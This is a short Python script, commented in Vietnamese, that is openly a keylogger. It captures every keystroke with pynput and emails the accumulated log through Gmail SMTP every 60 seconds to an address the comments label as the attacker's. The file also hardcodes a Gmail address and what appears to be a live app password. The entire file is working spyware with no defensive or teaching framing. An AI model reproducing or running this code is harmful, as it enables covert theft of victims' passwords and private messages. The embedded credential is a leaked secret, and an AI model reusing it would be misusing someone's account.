from pynput import keyboard
import smtplib
import threading
import time
from email.mime.text import MIMEText

# ===== CẤU HÌNH =====
EMAIL_SEND = "liem123s98@gmail.com"      # Email attacker dùng để gửi
EMAIL_PASSWORD = "ppfk lfft qbfa ttzo"     # Mật khẩu ứng dụng Gmail
EMAIL_RECEIVE = "liem123s98@gmail.com" # Email nhận log
SEND_INTERVAL = 60                        # Giây, gửi mỗi 60 giây
# ====================

log_data = ""

def send_email():
    global log_data
    if log_data.strip():
        msg = MIMEText(log_data)
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = EMAIL_SEND
        msg['To'] = EMAIL_RECEIVE
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(EMAIL_SEND, EMAIL_PASSWORD)
                server.send_message(msg)
            print("[+] Email sent")
        except Exception as e:
            print(f"[-] Error: {e}")
        log_data = ""
    # Lập lịch gửi lại
    threading.Timer(SEND_INTERVAL, send_email).start()

def on_press(key):
    global log_data
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_data += key.char
        else:
            # Xử lý phím đặc biệt
            if key == keyboard.Key.enter:
                log_data += '\n'
            elif key == keyboard.Key.space:
                log_data += ' '
            elif key == keyboard.Key.tab:
                log_data += '\t'
            else:
                log_data += f'[{key.name}]'
    except Exception as e:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Dừng nếu nhấn ESC

# Bắt đầu keylogger
print("[*] Keylogger started. Press ESC to stop.")
send_email()  # Bắt đầu vòng lặp gửi email

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
